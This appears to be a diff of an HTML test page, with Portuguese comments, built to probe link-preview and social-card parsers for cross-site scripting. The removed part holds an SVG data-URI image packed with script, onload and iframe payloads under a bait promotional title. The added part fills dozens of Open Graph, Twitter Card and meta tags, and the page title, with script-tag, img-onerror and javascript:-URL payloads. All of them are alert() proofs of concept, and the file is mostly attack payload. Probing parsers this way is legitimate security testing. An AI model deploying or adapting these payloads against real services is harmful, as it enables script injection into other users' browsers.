@@ -3,21 +3,82 @@
 <head>
   <meta charset="UTF-8">
   
-  <!-- Meta tags com SVG inline como data URI -->
-  <meta property="og:title" content="Promoção Imperdível! 🎁">
-  <meta property="og:description" content="Clique e ganhe desconto!">
+  <!-- Open Graph Básico -->
+  <meta property="og:title" content="<img src=x onerror='alert(&quot;XSS: og:title&quot;)'>">
+  <meta property="og:type" content="<script>alert('XSS: og:type')</script>">
+  <meta property="og:url" content="javascript:alert('XSS: og:url')">
+  <meta property="og:image" content="<img src=x onerror='alert(&quot;XSS: og:image&quot;)'>">
+  <meta property="og:image:url" content="javascript:alert('XSS: og:image:url')">
+  <meta property="og:image:secure_url" content="javascript:alert('XSS: og:image:secure_url')">
+  <meta property="og:image:type" content="<script>alert('XSS: og:image:type')</script>">
+  <meta property="og:image:width" content="<script>alert('XSS: og:image:width')</script>">
+  <meta property="og:image:height" content="<script>alert('XSS: og:image:height')</script>">
+  <meta property="og:image:alt" content="<img src=x onerror='alert(&quot;XSS: og:image:alt&quot;)'>">
   
-  <!-- SVG inline completo com todos os vetores XSS -->
-  <meta property="og:image" content="data:image/svg+xml,%3C%3Fxml%20version%3D%221.0%22%20standalone%3D%22no%22%3F%3E%3C%21DOCTYPE%20svg%20PUBLIC%20%22-%2F%2FW3C%2F%2FDTD%20SVG%201.1%2F%2FEN%22%20%22http%3A%2F%2Fwww.w3.org%2FGraphics%2FSVG%2F1.1%2FDTD%2Fsvg11.dtd%22%3E%3Csvg%20version%3D%221.1%22%20baseProfile%3D%22full%22%20width%3D%22100%22%20height%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20onload%3D%22alert('svg%20attribut')%22%3E%3Cpolygon%20id%3D%22lightning%22%20points%3D%220%2C100%2050%2C25%2050%2C75%20100%2C0%22%20fill%3D%22%23ff1919%22%20stroke%3D%22%23ff0000%22%2F%3E%3Cdesc%3E%3Cscript%3Ealert('svg%20desc')%3C%2Fscript%3E%3C%2Fdesc%3E%3CforeignObject%3E%3Cscript%3Ealert('svg%20foreignObject')%3C%2Fscript%3E%3C%2FforeignObject%3E%3CforeignObject%20width%3D%22500%22%20height%3D%22500%22%3E%3Ciframe%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%20src%3D%22javascript%3Aalert('svg%20foreignObject%20iframe')%3B%22%20width%3D%22400%22%20height%3D%22250%22%2F%3E%3C%2FforeignObject%3E%3Ctitle%3E%3Cscript%3Ealert('svg%20title')%3C%2Fscript%3E%3C%2Ftitle%3E%3Canimatetransform%20onbegin%3D%22alert('svg%20animatetransform%20onbegin')%22%3E%3C%2Fanimatetransform%3E%3Cscript%20type%3D%22text%2Fjavascript%22%3Ealert('svg%20script')%3B%3C%2Fscript%3E%3C%2Fsvg%3E">
+  <!-- Open Graph Opcional -->
+  <meta property="og:description" content="<script>alert('XSS: og:description')</script>">
+  <meta property="og:site_name" content="<img src=x onerror='alert(&quot;XSS: og:site_name&quot;)'>">
+  <meta property="og:locale" content="<script>alert('XSS: og:locale')</script>">
+  <meta property="og:locale:alternate" content="<script>alert('XSS: og:locale:alternate')</script>">
   
-  <meta property="og:url" content="https://seu-usuario.github.io/repo">
-  <meta property="og:type" content="website">
+  <!-- Open Graph Video -->
+  <meta property="og:video" content="javascript:alert('XSS: og:video')">
+  <meta property="og:video:url" content="javascript:alert('XSS: og:video:url')">
+  <meta property="og:video:secure_url" content="javascript:alert('XSS: og:video:secure_url')">
+  <meta property="og:video:type" content="<script>alert('XSS: og:video:type')</script>">
+  <meta property="og:video:width" content="<script>alert('XSS: og:video:width')</script>">
+  <meta property="og:video:height" content="<script>alert('XSS: og:video:height')</script>">
   
-  <title>XSS SVG Inline</title>
+  <!-- Open Graph Audio -->
+  <meta property="og:audio" content="javascript:alert('XSS: og:audio')">
+  <meta property="og:audio:url" content="javascript:alert('XSS: og:audio:url')">
+  <meta property="og:audio:secure_url" content="javascript:alert('XSS: og:audio:secure_url')">
+  <meta property="og:audio:type" content="<script>alert('XSS: og:audio:type')</script>">
+  
+  <!-- Open Graph Article -->
+  <meta property="article:published_time" content="<script>alert('XSS: article:published_time')</script>">
+  <meta property="article:modified_time" content="<script>alert('XSS: article:modified_time')</script>">
+  <meta property="article:expiration_time" content="<script>alert('XSS: article:expiration_time')</script>">
+  <meta property="article:author" content="<img src=x onerror='alert(&quot;XSS: article:author&quot;)'>">
+  <meta property="article:section" content="<script>alert('XSS: article:section')</script>">
+  <meta property="article:tag" content="<img src=x onerror='alert(&quot;XSS: article:tag&quot;)'>">
+  
+  <!-- Open Graph Book -->
+  <meta property="book:author" content="<img src=x onerror='alert(&quot;XSS: book:author&quot;)'>">
+  <meta property="book:isbn" content="<script>alert('XSS: book:isbn')</script>">
+  <meta property="book:release_date" content="<script>alert('XSS: book:release_date')</script>">
+  <meta property="book:tag" content="<img src=x onerror='alert(&quot;XSS: book:tag&quot;)'>">
+  
+  <!-- Open Graph Profile -->
+  <meta property="profile:first_name" content="<img src=x onerror='alert(&quot;XSS: profile:first_name&quot;)'>">
+  <meta property="profile:last_name" content="<img src=x onerror='alert(&quot;XSS: profile:last_name&quot;)'>">
+  <meta property="profile:username" content="<script>alert('XSS: profile:username')</script>">
+  <meta property="profile:gender" content="<script>alert('XSS: profile:gender')</script>">
+  
+  <!-- Twitter Cards -->
+  <meta name="twitter:card" content="<script>alert('XSS: twitter:card')</script>">
+  <meta name="twitter:site" content="<script>alert('XSS: twitter:site')</script>">
+  <meta name="twitter:creator" content="<img src=x onerror='alert(&quot;XSS: twitter:creator&quot;)'>">
+  <meta name="twitter:title" content="<img src=x onerror='alert(&quot;XSS: twitter:title&quot;)'>">
+  <meta name="twitter:description" content="<script>alert('XSS: twitter:description')</script>">
+  <meta name="twitter:image" content="javascript:alert('XSS: twitter:image')">
+  <meta name="twitter:image:alt" content="<img src=x onerror='alert(&quot;XSS: twitter:image:alt&quot;)'>">
+  <meta name="twitter:player" content="javascript:alert('XSS: twitter:player')">
+  <meta name="twitter:player:width" content="<script>alert('XSS: twitter:player:width')</script>">
+  <meta name="twitter:player:height" content="<script>alert('XSS: twitter:player:height')</script>">
+  <meta name="twitter:player:stream" content="javascript:alert('XSS: twitter:player:stream')">
+  
+  <!-- Outras Meta Tags Comuns -->
+  <meta name="description" content="<script>alert('XSS: description')</script>">
+  <meta name="keywords" content="<img src=x onerror='alert(&quot;XSS: keywords&quot;)'>">
+  <meta name="author" content="<script>alert('XSS: author')</script>">
+  <meta name="robots" content="<script>alert('XSS: robots')</script>">
+  <meta name="generator" content="<script>alert('XSS: generator')</script>">
+  <meta name="theme-color" content="<script>alert('XSS: theme-color')</script>">
+  
+  <title><script>alert('XSS: title')</script>Site Teste</title>
 </head>
 <body>
-  <h1>⚠️ XSS com SVG Inline (Data URI)</h1>
-  <p>SVG malicioso embutido direto na meta tag como data URI!</p>
-  <p>Pronto para subir no GitHub Pages! 🚀</p>
+  <h1>🔴 XSS em Todas as Tags Open Graph</h1>
 </body>
 </html>
